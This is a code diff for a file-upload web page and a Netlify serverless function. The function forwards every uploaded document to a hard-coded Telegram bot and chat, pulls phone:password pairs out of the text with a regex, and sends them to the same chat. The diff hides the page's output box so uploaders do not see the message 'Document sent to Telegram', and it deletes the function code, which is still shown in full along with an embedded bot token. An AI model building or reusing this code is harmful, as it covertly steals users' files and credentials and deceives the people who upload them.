@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -9,7 +8,8 @@
     body { font-family: Arial, sans-serif; margin: 20px; }
     input[type="file"] { margin-bottom: 10px; }
     button { margin-top: 10px; margin-right: 10px; }
-    textarea { width: 100%; height: 200px; margin-top: 10px; }
+    /* Hide the output textarea */
+    #output { display: none; }
   </style>
 </head>
 <body>
@@ -53,7 +53,9 @@
           })
         });
         const result = await response.json();
+        // Store output in hidden textarea
         outputArea.value = 'Document sent to Telegram.\n' + (result.message || '');
+        // Optional: alert or log for debugging
       };
 
       if (file.name.endsWith('.txt')) {
@@ -74,56 +76,3 @@
   </script>
 </body>
 </html>
-// netlify/functions/sendToTelegram.js
-const fetch = require('node-fetch');
-
-const TELEGRAM_BOT_TOKEN = 'AAEVZ23HMZmIisaxgYn939wPstcqJDSqefA'; // Replace with your bot token
-const CHAT_ID = '8677530088'; // Your chat ID
-
-exports.handler = async (event) => {
-  const body = JSON.parse(event.body);
-  const { fileName, fileType, fileData } = body;
-
-  // Send document to Telegram
-  const formData = new FormData();
-  formData.append('chat_id', CHAT_ID);
-  formData.append('document', Buffer.from(fileData, 'base64'), fileName);
-
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
-    method: 'POST',
-    body: formData
-  });
-
-  // Extract text from document for processing
-  let textContent = '';
-  if (fileType === 'txt') {
-    textContent = Buffer.from(fileData, 'base64').toString('utf8');
-  } else if (fileType === 'docx') {
-    // For simplicity, just send a message; extraction on server is complex
-    textContent = 'DOCX uploaded'; // You can add further parsing if needed
-  }
-
-  // Simple regex to extract phone:password pairs
-  const results = [];
-  const regex = /(\+?\d{10,15})\s*[:\-]?\s*(\w+)/g;
-  let match;
-  while ((match = regex.exec(textContent)) !== null) {
-    results.push(`${match[1]}:${match[2]}`);
-  }
-  const outputText = results.join('\n') || 'No matches found.';
-
-  // Send extraction results to your Telegram chat
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: `Extraction Results:\n${outputText}`
-    })
-  });
-
-  return {
-    statusCode: 200,
-    body: JSON.stringify({ message: 'Document sent and processed.', results: outputText }),
-  };
-};
